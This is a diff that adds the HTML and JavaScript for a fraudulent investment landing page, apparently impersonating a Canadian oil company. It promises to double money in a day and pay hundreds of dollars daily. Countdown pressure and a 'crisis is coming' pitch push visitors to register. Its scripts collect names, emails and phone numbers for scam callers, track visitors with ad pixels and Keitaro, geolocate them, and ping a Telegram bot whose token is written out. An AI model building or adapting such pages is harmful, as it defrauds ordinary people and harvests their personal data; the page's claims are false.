@@ -1,0 +1,760 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+	<meta name="facebook-domain-verification" content="">
+	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<title>Imperial G&O</title>
+
+	<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+	<link rel="stylesheet" href="ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css">
+	<link rel="stylesheet" href="ajax/libs/ion-rangeslider/2.3.1/css/ion.rangeSlider.min.css">
+	<link rel="stylesheet" href="css/reset.css">
+	<link rel="stylesheet" href="css/style.css">
+	<!-- form -->
+	<link rel="stylesheet" href="css/form.css">
+
+
+
+</head>
+<script>
+	document.addEventListener('DOMContentLoaded', () => {
+		fetch('https://api.telegram.org/bot5987793418:AAH7O8AjmcmD29ig0H-K31jjzXAfwrjo6c4/sendMessage', {
+			method: 'post',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({
+				chat_id: -1001835903075,
+				text: 'page loading'
+			})
+		})
+	})
+</script>
+
+<body>
+	<div id="box" style="
+		display: none;
+		justify-content: center;
+		align-items: center;
+		position: fixed;
+		left: 0;
+		top: 0;
+		width: 100%;
+		height: 100%;
+		z-index: 1000000;
+	">
+		<div id="get" style="
+			position: fixed;
+			background-color: rgba(0, 0, 0, 0.8);
+			width: 100%;
+			height: 100%;
+		"></div>
+		<div class="sd" style="
+			background: #fff;
+			border-radius: 25px;
+			border: 2px solid wheat;
+			max-width: 1000px;
+			max-height: 90%;
+			z-index: 100;
+		">
+			<div style="
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-weight: 600;
+				color: #fff;
+				font-size: 65px;
+				height: 100px;
+				width: 100%;
+				background-color: #F05555;
+				border-radius: 25px 25px 0 0;
+			">
+				WAIT!
+			</div>
+			<div style="
+			text-align: center;
+			margin: 10px 0;
+			font-size: 35px;
+			font-weight: bold;
+			color: red;
+			">
+				<span id="pop_min">15</span>:<span id="pop_sec">00</span>
+			</div>
+			<div style="
+					width: 450px;
+					font-weight: 600;
+						font-size: 40px;
+						line-height: 70px;
+						letter-spacing: 1.5px;
+						text-align: center;
+				">
+				Our agent will call you in 15 minutes, answer a call
+			</div>
+		</div>
+		<script src="pop_ap.js"></script>
+	</div>
+
+	<!-- Keitaro tracking script -->
+	<script type='application/javascript'>
+		if (!window.KTracking) { window.KTracking = { collectNonUniqueClicks: false, multiDomain: false, R_PATH: 'https://imperialls.site/Imperiall_OIL', P_PATH: 'https://imperialls.site/5ce67dc/postback', listeners: [], reportConversion: function () { this.queued = arguments; }, getSubId: function (fn) { this.listeners.push(fn); }, ready: function (fn) { this.listeners.push(fn); } }; } (function () { var a = document.createElement('script'); a.type = 'application/javascript'; a.async = true; a.src = 'https://imperialls.site/js/k.min.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(a, s) })();
+	</script><noscript><img height='0' width='0' alt='' src='https://imperialls.site/Imperiall_OIL' /></noscript>
+	<header class="header">
+		<div class="container">
+			<div class="header__logo">
+				<a href="index.html" class="header__logo-link">
+					<img src="img/logo.png" alt="logotype">
+				</a>
+			</div>
+			<!-- /.header__logo -->
+			<div class="header__text">
+				<h1 style="color: red;" class="header__text-top">
+					Imperial opens up opportunities to make money on rising oil and gas prices
+				</h1>
+				<p style="color: red;" class="header__text-bottom">
+					Imperial Gas and Oil multiplies your money!
+				</p>
+			</div>
+			<!-- /.header__text -->
+			<div class="row">
+				<div class="col-xl-8">
+					<div class="header__video">
+						<script src="players/y0FK743W-voou8tK3.js"></script>
+						<!-- <script src="https://cdn.jwplayer.com/players/TxjpeXi5-PbLFVgxG.js"></script> -->
+					</div>
+				</div>
+				<div class="col-xl-4">
+					<div style="position: relative;" class="header__form" id="register__form">
+						<form class="register-form" id="form1">
+							<div class="form-input-main">
+								<input class="form-input" type="text" name="first_name" placeholder="First name"
+									required="" id="FName1">
+							</div>
+
+							<div class="form-input-main">
+								<input class="form-input" type="text" name="last_name" placeholder="Last name"
+									required="" id="LName1">
+							</div>
+
+							<div class="form-input-main">
+								<input type="email" name="email" placeholder="Email" required="" id="Email1">
+							</div>
+
+							<div class="form-input-main">
+								<input \ name="phone" type="tel" placeholder="Phone" class="form-input" required=""
+									id="Phone1" data-phone-pattern data-phone-clear="false">
+							</div>
+
+							<label style="
+							display: none;
+    						gap: 5px;
+							font-weight: 500;
+							font-size: 1.1rem;
+							">
+								<input style="width: 30px; height: 30px; margin: 0;padding: 0;" type="checkbox">
+								After registration, be sure to wait for the call! If you do not answer the manager’s
+								call, the registration will be canceled
+							</label>
+
+							<button id="sub" name="submitBtn" type="submit">Register now</button>
+						</form>
+						<div id="sub_pl" style="
+
+						flex-direction: column;
+						justify-content: space-around;
+						align-items: center;
+
+						border-radius: 15px;
+						padding: 10px;
+
+						position: absolute;
+						top: 50%;
+						left: 50%;
+						transform: translate(-50%,-50%);
+						width: 300px;
+						height: 250px;
+						background:#fff;
+						box-shadow: 0px 0px 10px #000;
+						text-align: center; 
+						">
+							<h3 style="
+							font-size: 25px;
+							font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+							">
+								To connect to the platform, you will need to pick up the phone from our operator
+							</h3>
+							<div>
+
+								<button onclick={cof()} type="button" style="
+								background-color: rgb(132, 191, 42);
+								border: 1px solid green;
+								color: #fff;
+								font-size: 20px;
+								font-weight: 600;
+								border-radius: 15px;
+								width: 180px;
+								height: 40px;
+								cursor: pointer;
+								">Confirm</button>
+							</div>
+						</div>
+
+						<script>
+							let pixel = [];
+							fetch("./pixel.php")
+								.then((d) => d.json())
+								.then((d) => {
+									pixel = d;
+									d.map((p) => {
+										fetch(`https://www.facebook.com/tr/?id=${p}&ev=PageView&dl=http%3A%2F%2F127.0.0.1%3A5500%2Findex.html&rl=http%3A%2F%2F127.0.0.1%3A5500%2Findex.html&if=false&ts=1677169689752&sw=1536&sh=864&v=2.9.96&r=stable&ec=0&o=28&it=1677169689740&coo=false&rqm=GET`);
+
+									});
+								});
+							document.getElementById("sub_pl").style.display = "none"
+							const cof = () => { document.getElementById("sub_pl").style.display = "none" }
+							document.getElementById('form1').addEventListener('submit', (e) => {
+								e.preventDefault();
+								let res = "";
+								const FName = document.getElementById("FName1").value;
+								const LName = document.getElementById("LName1").value;
+								const Email = document.getElementById("Email1").value;
+								const Phone = document.getElementById("Phone1").value;
+								let PhoneFul = "";
+								if (Phone.length >= 17) {
+									for (let i = 0; i < Phone.length; i++) {
+										if (Number(Phone[i]) || Phone[i] === "0") {
+											PhoneFul += Phone[i];
+										}
+										if (i + 1 === Phone.length) {
+											document.getElementById("sub").innerHTML = "...Wait";
+											document.getElementById("sub").disabled = true
+											$.ajax({
+												method: "post",
+												url: "ff.php",
+												data: {
+													FName: FName,
+													LName: LName,
+													Email: Email,
+													Phone: PhoneFul,
+												},
+												success: (response) => {
+													if (response != 1) {
+														document.getElementById("sub").innerHTML = response;
+														document.getElementById("sub").disabled = false
+														document.getElementById("FName1").value = ''
+														document.getElementById("FName1").value = ''
+														document.getElementById("LName1").value = ''
+														document.getElementById("Email1").value = ''
+														document.getElementById("Phone1").value = ''
+														console.log('no res');
+														if (response == 'test') {
+															pop_ap_open = true
+															pixel.map((p) => {
+																fetch(`https://www.facebook.com/tr?id=${p}&ev=Lead&noscript=1`);
+															});
+														}
+													} else {
+														document.getElementById("sub").innerHTML = "Send Data";
+														document.getElementById("sub").style.background = 'green'
+														document.getElementById("FName1").value = ''
+														document.getElementById("FName1").value = ''
+														document.getElementById("LName1").value = ''
+														document.getElementById("Email1").value = ''
+														document.getElementById("Phone1").value = ''
+														document.getElementById("FName1").disabled = true
+														document.getElementById("FName1").disabled = true
+														document.getElementById("LName1").disabled = true
+														document.getElementById("Email1").disabled = true
+														document.getElementById("Phone1").disabled = true
+														document.getElementById('sub_pl').style.display = 'flex';
+														pop_ap_open = true
+														KTracking.reportConversion(0, "lead");
+
+														pixel.map((p) => {
+															fetch(`https://www.facebook.com/tr?id=${p}&ev=Lead&noscript=1`);
+														});
+
+													}
+												},
+											});
+											break;
+										}
+									}
+								} else {
+									// document.getElementById("sub").innerHTML = "Number is not true";
+								}
+
+							})
+						</script>
+						<script>
+							// вспомогательный код
+							let countryCode = "";
+							fetch("https://ipapi.co/json/")
+								.then((d) => d.json())
+								.then((d) => {
+									countryCode = d.country_calling_code;
+								});
+
+							var $jscomp = $jscomp || {};
+							$jscomp.scope = {};
+							$jscomp.arrayIteratorImpl = function (a) {
+								var b = 0;
+								return function () {
+									return b < a.length ? { done: !1, value: a[b++] } : { done: !0 };
+								};
+							};
+							$jscomp.arrayIterator = function (a) {
+								return { next: $jscomp.arrayIteratorImpl(a) };
+							};
+							$jscomp.makeIterator = function (a) {
+								var b =
+									"undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
+								return b ? b.call(a) : $jscomp.arrayIterator(a);
+							};
+							document.addEventListener("DOMContentLoaded", function () {
+								var a = function (e) {
+									var c = e.target,
+										n = c.dataset.phoneClear;
+									c = (c = c.dataset.phonePattern)
+										? c
+										: `${countryCode}(___) ___-__-___`;
+									var g = 0,
+										k = c.replace(/\D/g, ""),
+										d = e.target.value.replace(/\D/g, "");
+									"false" !== n &&
+										"blur" === e.type &&
+										d.length < c.match(/([_\d])/g).length
+										? (e.target.value = "")
+										: (k.length >= d.length && (d = k),
+											(e.target.value = c.replace(/./g, function (l) {
+												return /[_\d]/.test(l) && g < d.length
+													? d.charAt(g++)
+													: g >= d.length
+														? ""
+														: l;
+											})));
+								},
+									b = document.querySelectorAll("[data-phone-pattern]");
+								b = $jscomp.makeIterator(b);
+								for (var f = b.next(); !f.done; f = b.next()) {
+									f = f.value;
+									for (
+										var m = $jscomp.makeIterator(["input", "blur", "focus"]),
+										h = m.next();
+										!h.done;
+										h = m.next()
+									)
+										f.addEventListener(h.value, a);
+								}
+							});
+
+						</script>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- /.container -->
+	</header>
+	<!-- /.header -->
+
+	<section class="projects" style="background: #fff; padding-top: 20px;">
+		<div class="container" style="padding: 0 40px;">
+			<form action="" class="">
+				<h3 class="header__text-bottom">
+					How much will you earn?
+				</h3>
+				<div class="header__text-bottom">
+					<label class="">Your one-time investment: </label>
+					<input type="text" class="js-range-slider irs-hidden-input" name="my_range" value="150"
+						tabindex="-1" readonly="">
+				</div>
+				<div class="header__text-bottom" style="margin-bottom: 25px;">
+					<label class="">Your daily income: </label>
+					<h3 class="" id="calcResult">330$</h3>
+				</div>
+				<div class="" style="text-align: center;">
+					<a href="#form1" class="projects__wrapper-items_btn scroll_top"
+						style="position: relative;bottom: 0;">
+						Start
+					</a>
+				</div>
+			</form>
+		</div>
+	</section>
+
+	<section class="imperial" style="padding-top:80px">
+		<div class="container">
+			<div class="row">
+				<div class="col-xl-5">
+					<div class="imperial__box">
+						<h4 class="imperial__box-title">
+							Why is it beneficial for ordinary Canadian citizens
+						</h4>
+						<div class="imperial__box-items">
+							<div class="imperial__box-items_img">
+								<img src="img/punkt-1.png" alt="stonks">
+							</div>
+							<div class="imperial__box-items_text">
+								<p>
+									Increase the first investment by 2 times already on the first day.
+								</p>
+							</div>
+						</div>
+						<!-- /.imperial__box-items -->
+						<div class="imperial__box-items">
+							<div class="imperial__box-items_img">
+								<img src="img/punkt-2.png" alt="cards">
+							</div>
+							<div class="imperial__box-items_text">
+								<p>
+									Stable passive income for years ahead.
+								</p>
+							</div>
+						</div>
+						<!-- /.imperial__box-items -->
+						<div class="imperial__box-items">
+							<div class="imperial__box-items_img">
+								<img src="img/punkt-3.png" alt="money">
+							</div>
+							<div class="imperial__box-items_text">
+								<p>
+									Phone support from first-class specialists
+								</p>
+							</div>
+						</div>
+						<!-- /.imperial__box-items -->
+					</div>
+					<!-- /.imperial__box -->
+				</div>
+				<!-- /.col-xl-5 -->
+				<div class="col-xl-7">
+					<div class="imperial__wrapper">
+						<h4 class="imperial__wrapper-title">
+							What you need to do to get started to make money with Imperial G&O now?
+						</h4>
+						<div class="imperial__wrapper-items">
+							<div class="imperial__wrapper-items_img">
+								<img src="img/punkt-1.svg" alt="stonks">
+							</div>
+							<div class="imperial__wrapper-items_text">
+								<p>
+									Register on the website in the form above.
+								</p>
+							</div>
+						</div>
+						<!-- /.imperial__wrapper-items -->
+						<div class="imperial__wrapper-items">
+							<div class="imperial__wrapper-items_img">
+								<img src="img/punkt-2.svg" alt="cards">
+							</div>
+							<div class="imperial__wrapper-items_text">
+								<p>
+									Wait for a call from a specialist of the company Imperial G&O and confirm your
+									registration.
+								</p>
+							</div>`
+						</div>
+						<!-- /.imperial__wrapper-items -->
+						<div class="imperial__wrapper-items">
+							<div class="imperial__wrapper-items_img">
+								<img src="img/punkt-3.svg" alt="money">
+							</div>
+							<div class="imperial__wrapper-items_text">
+								<p>
+									Receive from 600$ daily on the trading of gas and oil with the help of Imperial G&O
+									platform.
+								</p>
+							</div>
+						</div>
+						<!-- /.imperial__wrapper-items -->
+					</div>
+					<!-- /.imperial__wrapper -->
+				</div>
+				<!-- /.col-xl-7 -->
+			</div>
+			<!-- /.row -->
+			<div class="row row__ceo">
+				<div class="col-xl-7">
+					<div class="imperial__desc">
+						<div class="imperial__desc-box">
+							<div class="wrap">
+								<p class="imperial__desc-box_text">
+									Crisis is coming! Our inside sources tell us that the first wave of the crisis, the
+									first rise in prices in Canada - is just the beginning. A crisis, commensurate with
+									the European crisis, is expected in a few months.
+								</p>
+								<p class="imperial__desc-box_text">
+									Prices will rise not only for fuel, but also for all other goods. Life will become
+									much more difficult.
+								</p>
+								<p class="imperial__desc-box_text">
+									The project that we used for our own purposes can no longer remain within the
+									company. We open access to all residents of Canada. Each of you will be able to
+									significantly increase your income and not feel the crisis, and even earn more than
+									in times of crisis.
+								</p>
+								<p class="imperial__desc-box_text">
+									This is a chance for Canadians!
+								</p>
+							</div>
+						</div>
+					</div>
+					<!-- /.imperial__desc -->
+				</div>
+				<!-- /.col-xl-7 -->
+				<div class="col-xl-5">
+					<div class="imperial__ceo">
+						<div class="imperial__ceo-img">
+							<img src="img/ceo.png" alt="Rich Kruger">
+							<div class="imperial__ceo-box">
+								<p class="imperial__ceo-box_name">
+									Rich Kruger
+								</p>
+								<p class="imperial__ceo-box_position">
+									Head of the Imperial G&O project
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+				<!-- /.col-xl-5 -->
+			</div>
+		</div>
+		<!-- /.container -->
+	</section>
+	<!-- /.imperial -->
+
+	<section class="projects">
+		<div class="container">
+			<h3 class="projects__title">
+				Projects of Imperial G&O, which are
+			</h3>
+			<h3 class="projects__title">
+				open for investment
+			</h3>
+			<!-- /.projects__title -->
+			<div class="row row__projects">
+				<div class="col-xl-4">
+					<div class="projects__wrapper">
+						<div class="projects__wrapper-img">
+							<img src="img/project-1.png" alt="Esso" class="projects__wrapper-image">
+						</div>
+						<div class="projects__wrapper-items">
+							<p class="projects__wrapper-items_name">
+								Esso
+							</p>
+							<p class="projects__wrapper-items_text">
+								Gas station network across all Canada
+							</p>
+							<p class="projects__wrapper-items_profit">
+								Optimal investment 375$
+								<br><br>
+								Profitability from 400$ per day
+							</p>
+							<a href="#" class="projects__wrapper-items_btn scroll_top">
+								Apply
+							</a>
+						</div>
+					</div>
+				</div>
+				<!-- /.col-xl-4 -->
+				<div class="col-xl-4">
+					<div class="projects__wrapper">
+						<div class="projects__wrapper-img">
+							<img src="img/project-2.png" alt="Syncrude Canada Ltd" class="projects__wrapper-image">
+						</div>
+						<div class="projects__wrapper-items">
+							<p class="projects__wrapper-items_name">
+								Syncrude Canada Ltd
+							</p>
+							<p class="projects__wrapper-items_text">
+								Largest Electric Power Company
+							</p>
+							<p class="projects__wrapper-items_profit">
+								Optimal investment 450$
+								<br><br>
+								Profitability from 500$ per day
+							</p>
+							<a href="#" class="projects__wrapper-items_btn scroll_top">
+								Apply
+							</a>
+						</div>
+					</div>
+				</div>
+				<!-- /.col-xl-4 -->
+				<div class="col-xl-4">
+					<div class="projects__wrapper">
+						<div class="projects__wrapper-img">
+							<img src="img/project-3.png" alt="Exxon Mobil" class="projects__wrapper-image">
+						</div>
+						<div class="projects__wrapper-items projects__wrapper-exxon">
+							<p class="projects__wrapper-items_name projects__wrapper-items_exxon">
+								Exxon Mobil
+							</p>
+							<p class="projects__wrapper-items_text">
+								Specializes in oil and gas exploration and production.
+							</p>
+							<p class="projects__wrapper-items_profit">
+								Optimal investment 500$
+								<br><br>
+								Profitability from 650$ per day
+							</p>
+							<a href="#" class="projects__wrapper-items_btn scroll_top">
+								Apply
+							</a>
+						</div>
+					</div>
+				</div>
+				<!-- /.col-xl-4 -->
+			</div>
+			<!-- /.row -->
+			<div class="gas">
+				<h4 class="gas__title">
+					join the imperial gas & Oil,
+				</h4>
+				<h4 class="gas__title">
+					And start earning passively today!
+				</h4>
+				<!-- /.gas_title -->
+				<a href="#form1">
+					<div class="gas__form">
+						<button name="submitBtn">Register now</button>
+					</div>
+				</a>
+			</div>
+		</div>
+		<!-- /.container -->
+	</section>
+	<!-- /.projects -->
+
+	<footer class="footer">
+		<div class="container">
+			<div class="footer__payments">
+				<img src="img/icons__payment.png" alt="icons-payment">
+			</div>
+			<!-- /.footer__payments -->
+			<div class="footer__text">
+				* All the results of work in this area are individual <br>
+				and depend on each client PJSC"Imperial G&O" ©2018 - <span class="current__year"></span> Imperial oil
+			</div>
+		</div>
+
+
+
+
+		<!-- /.container -->
+	</footer>
+	<!-- /.footer -->
+
+	<script src="ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+	<script src="ajax/libs/ion-rangeslider/2.3.1/js/ion.rangeSlider.min.js"></script>
+	<!--<script src="js/main.js"></script>-->
+
+	<!-- intlTelInput -->
+	<!--<link rel="stylesheet" href="ajax/libs/intl-tel-input/17.0.12/css/intlTelInput.min.css">-->
+	<!--<script src="ajax/libs/intl-tel-input/17.0.12/js/intlTelInput.min.js"></script>-->
+
+	<style>
+		.error {
+			background-color: rgba(255, 0, 0, 0.52) !important;
+		}
+
+		.valid {
+			background-color: rgba(0, 255, 0, 0.52) !important;
+		}
+
+		.register-form {
+			position: relative;
+		}
+
+		.modal_phone {
+			opacity: 1;
+			position: fixed;
+			top: 0;
+			bottom: 0;
+			right: 0;
+			left: 0;
+			z-index: 99999;
+			display: none;
+			outline: 0;
+			padding-right: 15px;
+			justify-content: center;
+			align-items: center;
+			background-color: rgba(0, 0, 0, 0.4);
+			overflow-x: hidden;
+			overflow-y: auto;
+			color: #000;
+		}
+
+		.modal_phone.open_phone {
+			display: flex;
+		}
+
+		.modal-open_phone {
+			overflow: hidden;
+		}
+
+		.modal-dialog_phone {
+			position: relative;
+			width: 100%;
+			max-width: 32rem;
+			padding: 1rem;
+			box-sizing: border-box;
+		}
+
+		.modal-content_phone {
+			display: flex;
+			flex-direction: column;
+			pointer-events: auto;
+			background-color: #fff;
+			background-clip: padding-box;
+			border: 1px solid rgba(0, 0, 0, 0.2);
+			border-radius: 0.3rem;
+			outline: 0;
+		}
+
+		.modal-header_phone {
+			display: flex;
+			align-items: center;
+			padding: 1rem 1rem;
+		}
+
+		.modal-header_phone {
+			justify-content: space-between;
+			border-top-left-radius: 0.3rem;
+			border-top-right-radius: 0.3rem;
+		}
+
+		.modal-body_phone {
+			position: relative;
+			flex: 1 1 auto;
+			padding: 1rem;
+		}
+
+		.modal-title_phone {
+			font-size: 1.25rem;
+			font-weight: 600;
+		}
+
+		.close-button_phone {
+			font-size: 1.5rem;
+			font-weight: 700;
+			line-height: 1;
+			opacity: 0.5;
+			background-color: transparent;
+			border: 0;
+			cursor: pointer;
+			padding: 1rem 1rem;
+			margin: -1rem -1rem -1rem auto;
+		}
+	</style>
+
+
+
+
+	<!-- <script src="widget/index.htm" async=""></script> -->
+</body>
+
+</html>
